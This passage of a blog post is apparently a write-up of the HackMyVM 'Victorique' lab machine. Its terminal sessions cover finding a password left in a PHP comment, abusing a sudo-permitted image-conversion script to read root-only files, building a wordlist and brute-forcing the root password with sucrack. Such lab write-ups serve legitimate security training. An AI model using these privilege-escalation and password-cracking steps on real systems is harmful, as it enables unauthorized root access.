+<h3 id="Root"><a href="#Root" class="headerlink" title="Root"></a>Root</h3><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs tap">victorique@Victorique:~$ ls -al<br>total 140<br>drwxr-xr-x <span class="hljs-number"> 4 </span>victorique victorique  <span class="hljs-number"> 4096 </span>Dec<span class="hljs-number"> 12 </span>21:35 .<br>drwxr-xr-x <span class="hljs-number"> 3 </span>root       root        <span class="hljs-number"> 4096 </span>Dec<span class="hljs-number"> 12 </span>04:55 ..<br>lrwxrwxrwx <span class="hljs-number"> 1 </span>root       root           <span class="hljs-number"> 9 </span>Dec<span class="hljs-number"> 12 </span>02:36 .bash_history -&gt; /dev/null<br>-rw-r--r-- <span class="hljs-number"> 1 </span>victorique victorique   <span class="hljs-number"> 220 </span>Apr<span class="hljs-number"> 18 </span><span class="hljs-number"> 2019 </span>.bash_logout<br>-rw-r--r-- <span class="hljs-number"> 1 </span>victorique victorique  <span class="hljs-number"> 3526 </span>Apr<span class="hljs-number"> 18 </span><span class="hljs-number"> 2019 </span>.bashrc<br>drwxr-xr-x<span class="hljs-number"> 12 </span>victorique victorique  <span class="hljs-number"> 4096 </span>Dec<span class="hljs-number"> 12 </span>00:21 Geo<br>-rw-r--r-- <span class="hljs-number"> 1 </span>root       root         <span class="hljs-number"> 149 </span>Dec<span class="hljs-number"> 12 </span>21:35 hint.txt<br>-rwx------ <span class="hljs-number"> 1 </span>root       root      <span class="hljs-number"> 105918 </span>Dec<span class="hljs-number"> 12 </span>04:08 .kagura.png<br>drwxr-xr-x <span class="hljs-number"> 2 </span>victorique victorique  <span class="hljs-number"> 4096 </span>Dec<span class="hljs-number"> 12 </span>21:36 .oracle_jre_usage<br>-rw-r--r-- <span class="hljs-number"> 1 </span>victorique victorique   <span class="hljs-number"> 807 </span>Apr<span class="hljs-number"> 18 </span><span class="hljs-number"> 2019 </span>.profile<br>-rw-r--r-- <span class="hljs-number"> 1 </span>root       root          <span class="hljs-number"> 33 </span>Dec<span class="hljs-number"> 12 </span>02:40 user.txt<br><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql">victorique<span class="hljs-variable">@Victorique</span>:<span class="hljs-operator">~</span>$ cat hint.txt <br>Found <span class="hljs-keyword">some</span> useful fragments. Converted them <span class="hljs-keyword">into</span> a visual representation.<br><br>                                                         <span class="hljs-comment">--Cordelia Gallo</span><br></code></pre></td></tr></table></figure>
+
+<p>家目录下有些文件很可疑，有个png图片仅允许root查看。</p>
+<p>信息收集，在网站目录下找到了用户victorique的密码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs php">victorique@Victorique:/<span class="hljs-keyword">var</span>/www/html$ ls<br>image  index.html  IoIooIIOIOio  library.html  login.php  profile.html<br>victorique@Victorique:/<span class="hljs-keyword">var</span>/www/html$ cat login.php <br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// 如果是 POST 请求，处理登录验证逻辑</span><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="hljs-string">&#x27;POST&#x27;</span>) &#123;<br>    <span class="hljs-comment">// 获取 JSON 输入</span><br>    <span class="hljs-variable">$json</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br>    <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">json_decode</span>(<span class="hljs-variable">$json</span>, <span class="hljs-literal">true</span>);<br><br>    <span class="hljs-variable">$username</span> = <span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;username&#x27;</span>] ?? <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-variable">$password</span> = <span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;password&#x27;</span>] ?? <span class="hljs-string">&#x27;&#x27;</span>;<br><br>    <span class="hljs-comment">// 设置响应头为 JSON</span><br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Type: application/json&#x27;</span>);<br><br>    <span class="hljs-comment">// 验证逻辑 (在服务器端执行，前端不可见)</span><br>    <span class="hljs-comment">// 用户 victorique 的密码,User victorique&#x27;s Password: shinigami_qujo</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$username</span> === <span class="hljs-string">&#x27;ookami&#x27;</span> &amp;&amp; <span class="hljs-variable">$password</span> === <span class="hljs-string">&#x27;GoS1Ck&#x27;</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>([<br>            <span class="hljs-string">&#x27;status&#x27;</span> =&gt; <span class="hljs-string">&#x27;success&#x27;</span>,<br>            <span class="hljs-string">&#x27;msgEn&#x27;</span> =&gt; <span class="hljs-string">&#x27;&quot;The cunning gray wolf has deceived you. The gift lies deeper.&quot;&#x27;</span>,<br>            <span class="hljs-string">&#x27;msgJp&#x27;</span> =&gt; <span class="hljs-string">&#x27;「狡猾な灰色の狼はあなたを欺いた。贈り物はもっと深くにある。」&#x27;</span><br>        ]);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>([<br>            <span class="hljs-string">&#x27;status&#x27;</span> =&gt; <span class="hljs-string">&#x27;fail&#x27;</span>,<br>            <span class="hljs-string">&#x27;msgEn&#x27;</span> =&gt; <span class="hljs-string">&#x27;Access Denied: The chaotic fragments reject you.&#x27;</span>,<br>            <span class="hljs-string">&#x27;msgJp&#x27;</span> =&gt; <span class="hljs-string">&#x27;アクセス拒否：混沌の欠片があなたを拒絶しています。&#x27;</span><br>        ]);<br>    &#125;<br>    <span class="hljs-comment">// 结束执行，防止输出 HTML</span><br>    <span class="hljs-keyword">exit</span>;<br><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs elixir">victorique<span class="hljs-variable">@Victorique</span><span class="hljs-symbol">:/var/www/html</span><span class="hljs-variable">$ </span>sudo -l<br>[sudo] password <span class="hljs-keyword">for</span> <span class="hljs-symbol">victorique:</span> <br><span class="hljs-title class_">Matching</span> <span class="hljs-title class_">Defaults</span> entries <span class="hljs-keyword">for</span> victorique on <span class="hljs-symbol">Victorique:</span><br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\<span class="hljs-symbol">:/usr/local/bin</span>\<span class="hljs-symbol">:/usr/sbin</span>\<span class="hljs-symbol">:/usr/bin</span>\<span class="hljs-symbol">:/sbin</span>\<span class="hljs-symbol">:/bin</span><br><br><span class="hljs-title class_">User</span> victorique may run the following commands on <span class="hljs-symbol">Victorique:</span><br>    (<span class="hljs-title class_">ALL</span>) /usr/bin/python3 /opt/img2txt.py *<br><br></code></pre></td></tr></table></figure>
+
+<p>发现可以免密执行这个东西。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs python">victorique@Victorique:~$ cat /opt/img2txt.py <br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">@author: Viet Nguyen &lt;nhviet1009@gmail.com&gt;</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">import</span> argparse<br><br><span class="hljs-keyword">import</span> cv2<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_args</span>():<br>    parser = argparse.ArgumentParser(<span class="hljs-string">&quot;Image to ASCII&quot;</span>)<br>    parser.add_argument(<span class="hljs-string">&quot;--input&quot;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-built_in">str</span>, default=<span class="hljs-string">&quot;data/input.jpg&quot;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;Path to input image&quot;</span>)<br>    parser.add_argument(<span class="hljs-string">&quot;--output&quot;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-built_in">str</span>, default=<span class="hljs-string">&quot;data/output.txt&quot;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;Path to output text file&quot;</span>)<br>    parser.add_argument(<span class="hljs-string">&quot;--mode&quot;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-built_in">str</span>, default=<span class="hljs-string">&quot;complex&quot;</span>, choices=[<span class="hljs-string">&quot;simple&quot;</span>, <span class="hljs-string">&quot;complex&quot;</span>],<br>                        <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;10 or 70 different characters&quot;</span>)<br>    parser.add_argument(<span class="hljs-string">&quot;--num_cols&quot;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-built_in">int</span>, default=<span class="hljs-number">150</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;number of character for output&#x27;s width&quot;</span>)<br>    args = parser.parse_args()<br>    <span class="hljs-keyword">return</span> args<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>(<span class="hljs-params">opt</span>):<br>    <span class="hljs-keyword">if</span> opt.mode == <span class="hljs-string">&quot;simple&quot;</span>:<br>        CHAR_LIST = <span class="hljs-string">&#x27;@%#*+=-:. &#x27;</span><br>    <span class="hljs-keyword">else</span>:<br>        CHAR_LIST = <span class="hljs-string">&quot;$@B%8&amp;WM#*oahkbdpqwmZO0QLCJUYXzcvunxrjft/\|()1&#123;&#125;[]?-_+~&lt;&gt;i!lI;:,\&quot;^`&#x27;. &quot;</span><br>    num_chars = <span class="hljs-built_in">len</span>(CHAR_LIST)<br>    num_cols = opt.num_cols<br>    image = cv2.imread(opt.<span class="hljs-built_in">input</span>)<br>    image = cv2.cvtColor(image, cv2.COLOR_BGR2GRAY)<br>    height, width = image.shape<br>    cell_width = width / opt.num_cols<br>    cell_height = <span class="hljs-number">2</span> * cell_width<br>    num_rows = <span class="hljs-built_in">int</span>(height / cell_height)<br>    <span class="hljs-keyword">if</span> num_cols &gt; width <span class="hljs-keyword">or</span> num_rows &gt; height:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Too many columns or rows. Use default setting&quot;</span>)<br>        cell_width = <span class="hljs-number">6</span><br>        cell_height = <span class="hljs-number">12</span><br>        num_cols = <span class="hljs-built_in">int</span>(width / cell_width)<br>        num_rows = <span class="hljs-built_in">int</span>(height / cell_height)<br><br>    output_file = <span class="hljs-built_in">open</span>(opt.output, <span class="hljs-string">&#x27;w&#x27;</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(num_rows):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(num_cols):<br>            output_file.write(<br>                CHAR_LIST[<span class="hljs-built_in">min</span>(<span class="hljs-built_in">int</span>(np.mean(image[<span class="hljs-built_in">int</span>(i * cell_height):<span class="hljs-built_in">min</span>(<span class="hljs-built_in">int</span>((i + <span class="hljs-number">1</span>) * cell_height), height),<br>                                          <span class="hljs-built_in">int</span>(j * cell_width):<span class="hljs-built_in">min</span>(<span class="hljs-built_in">int</span>((j + <span class="hljs-number">1</span>) * cell_width),<br>                                                                  width)]) * num_chars / <span class="hljs-number">255</span>), num_chars - <span class="hljs-number">1</span>)])<br>        output_file.write(<span class="hljs-string">&quot;\n&quot;</span>)<br>    output_file.close()<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    opt = get_args()<br>    main(opt)<br><br></code></pre></td></tr></table></figure>
+
+<p>这段代码的功能是将图片转换为字符画，结合hint.txt,提示我们寻找碎片，应该还有其他几张图片</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs stylus">victorique@Victorique:~$ find / -type f -name <span class="hljs-string">&quot;.*.png&quot;</span> <span class="hljs-number">2</span>&gt;/dev/null<br>/home/victorique/<span class="hljs-selector-class">.kagura</span><span class="hljs-selector-class">.png</span><br>/opt/<span class="hljs-selector-class">.kujo</span><span class="hljs-selector-class">.png</span><br>/etc/ssh/<span class="hljs-selector-class">.shinigami</span><span class="hljs-selector-class">.png</span><br>/var/www/html/<span class="hljs-selector-class">.victorique</span><span class="hljs-selector-class">.png</span><br><br>victorique@Victorique:~$ ls -al /opt/<span class="hljs-selector-class">.kujo</span><span class="hljs-selector-class">.png</span><br>-rwx------ <span class="hljs-number">1</span> root root <span class="hljs-number">70668</span> Dec <span class="hljs-number">12</span> <span class="hljs-number">04</span>:<span class="hljs-number">54</span> /opt/<span class="hljs-selector-class">.kujo</span><span class="hljs-selector-class">.png</span><br>victorique@Victorique:~$ ls -al <span class="hljs-comment">//etc/ssh/.shinigami.png</span><br>-rwx------ <span class="hljs-number">1</span> root root <span class="hljs-number">5161</span> Dec <span class="hljs-number">12</span> <span class="hljs-number">20</span>:<span class="hljs-number">35</span> <span class="hljs-comment">//etc/ssh/.shinigami.png</span><br>victorique@Victorique:~$ ls -al/var/www/html/<span class="hljs-selector-class">.victorique</span><span class="hljs-selector-class">.png</span><br>ls: invalid <span class="hljs-selector-tag">option</span> -- <span class="hljs-string">&#x27;/&#x27;</span><br>Try <span class="hljs-string">&#x27;ls --help&#x27;</span> <span class="hljs-keyword">for</span> more information.<br>victorique@Victorique:~$ ls -al /var/www/html/<span class="hljs-selector-class">.victorique</span><span class="hljs-selector-class">.png</span><br>-rwx------ <span class="hljs-number">1</span> root root <span class="hljs-number">113801</span> Dec <span class="hljs-number">12</span> <span class="hljs-number">04</span>:<span class="hljs-number">08</span> /var/www/html/<span class="hljs-selector-class">.victorique</span><span class="hljs-selector-class">.png</span><br>victorique@Victorique:~$ <br></code></pre></td></tr></table></figure>
+
+<p>但是这里我发现几张图片根本没用，而且图片格式不限于png(一共有三种形式，png，webp，ppm),继续寻找</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">sudo /usr/bin/python3 /opt/img2txt<span class="hljs-selector-class">.py</span> <span class="hljs-attr">--input</span> /usr/games/<span class="hljs-selector-class">.haru</span><span class="hljs-selector-class">.ppm</span> <span class="hljs-attr">--output</span> <span class="hljs-number">1</span><span class="hljs-selector-class">.txt</span> <span class="hljs-attr">--mode</span> simple<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2026/01/09/HackMyVM-Victorique/vmware_2dPUiqO76g.png" srcset="/img/loading.gif" lazyload></p>
+<p>第一块碎片，来源：&#x2F;etc&#x2F;ssh&#x2F;.shinigami.png</p>
+<p><img src="/2026/01/09/HackMyVM-Victorique/vmware_UsWLTGtRfU.png" srcset="/img/loading.gif" lazyload></p>
+<p>第二块碎片，来源：&#x2F;var&#x2F;www&#x2F;html&#x2F;IoIooIIOIOio&#x2F;sunset.webp</p>
+<p><img src="/2026/01/09/HackMyVM-Victorique/vmware_5N6j5Z7Pae.png" srcset="/img/loading.gif" lazyload></p>
+<p>第三块碎片，来源：&#x2F;usr&#x2F;games&#x2F;.haru.ppm</p>
+<p>之后对这些碎片字符画进行排列组合，得到如下字典</p>
+<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs smali">C11pp3r510n5h1pch4mp<br>C11pp3r5ch4mp10n5h1p<br>10n5h1pC11pp3r5ch4mp<br>10n5h1pch4mpC11pp3r5<br>ch4mpC11pp3r510n5h1p<br>ch4mp10n5h1pC11pp3r5<br></code></pre></td></tr></table></figure>
+
+<p>爆破得到root密码</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs elixir">victorique<span class="hljs-variable">@Victorique</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>./sucrack -u root -w <span class="hljs-number">20</span> <span class="hljs-number">2</span>.txt <br>password <span class="hljs-symbol">is:</span> <span class="hljs-title class_">C11pp3r5ch4mp10n5h1p</span><br>root<span class="hljs-variable">@Victorique</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># ls</span><br>root.png<br><br></code></pre></td></tr></table></figure>
+
+<p>这里flag也是png，也可以用刚刚的脚本转换，不过我嫌麻烦直接传到攻击机上打开了。</p>
+<p><img src="/2026/01/09/HackMyVM-Victorique/Photos_mQpaENkWFY.png" srcset="/img/loading.gif" lazyload></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/HMV/" class="print-no-link">#HMV</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>HackMyVM-Victorique</div>
+      <div>http://example.com/2026/01/09/HackMyVM-Victorique/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>Skyarrow</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>January 9, 2026</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/01/08/%E4%B8%80%E4%BA%9Bshell%E8%A7%A3%E6%9E%90%E6%8F%90%E6%9D%83%E7%9A%84%E5%B0%8Ftricks/" title="一些提权的小tricks">
+                        <span class="hidden-mobile">一些提权的小tricks</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  <span id="busuanzi_container_site_pv">
+    本站总访问量<span id="busuanzi_value_site_pv"></span>次
+</span>
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
